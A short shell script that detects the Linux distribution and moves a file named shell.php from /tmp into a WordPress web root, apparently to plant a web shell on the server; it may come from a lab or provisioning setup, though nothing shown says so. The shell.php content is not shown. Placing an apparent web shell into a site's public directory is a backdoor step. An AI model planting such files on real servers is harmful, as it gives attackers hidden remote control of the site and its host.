#!/bin/sh

RHEL(){
    mv /tmp/shell.php /var/www/html/wordpress/shell.php
}

DEBIAN(){
    RHEL
}

UBUNTU(){
    RHEL
}

ALPINE(){
    mv /tmp/shell.php /var/www/localhost/wordpress/shell.php
}


if command -v yum >/dev/null ; then
    RHEL
elif command -v apt-get >/dev/null ; then
    if $(cat /etc/os-release | grep -qi Ubuntu); then
        UBUNTU
    else
        DEBIAN
    fi
elif command -v apk >/dev/null ; then
    ALPINE
fi
